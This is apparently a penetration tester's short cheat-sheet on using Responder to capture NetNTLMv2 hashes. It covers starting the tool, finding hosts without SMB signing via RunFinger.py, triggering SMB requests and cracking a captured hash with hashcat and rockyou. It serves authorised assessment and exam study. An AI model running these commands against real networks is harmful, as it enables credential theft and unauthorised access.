Cannot use in the OSCP Exam. Fun to use on assessments.
Note: Multirelay.py does not work in python3 since the UserDict library has been depricated

# Source: https://github.com/lgandx/Responder

## Make changes to config to turn off services:

nano /usr/share/responder/Responder.conf

## Starting Responder:

- responder -I \[Interface\] -A
- responder -I \[Interface\] -i \[IP Address\] or -e \[External IP\] -A

## Tools in Responder:

Location: /usr/share/Responder/tools

## Check for systems with SMB Signing not enabled

- python3 RunFinger.py -i 172.21.0.0/24

#
# Responder
```
sudo responder -v -F -w -b  -I tun0
```
- [ ] setup the listener
![728e160513423988dc5d56f929211e65.png](../../../_resources/728e160513423988dc5d56f929211e65.png)

- [ ] Make smb request to local From commandline on remote system 
![76fefa07be090e51ffe1d6d885c6a74b.png](../../../_resources/76fefa07be090e51ffe1d6d885c6a74b.png)

- [ ] Responder Captures, write to file on local machine 
![a80e86b5957da2d1a3611f16510fb5e0.png](../../../_resources/a80e86b5957da2d1a3611f16510fb5e0.png)

 - [x] Find hashcat value and execute
`hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`
 ![cff3e9a4bb2cce394a70e5b37895be7c.png](../../../_resources/cff3e9a4bb2cce394a70e5b37895be7c.png)

***Finished***

![0d2f3ffe9e7aafeb1ea076b1dac22af4.png](../../../_resources/0d2f3ffe9e7aafeb1ea076b1dac22af4.png)


 
 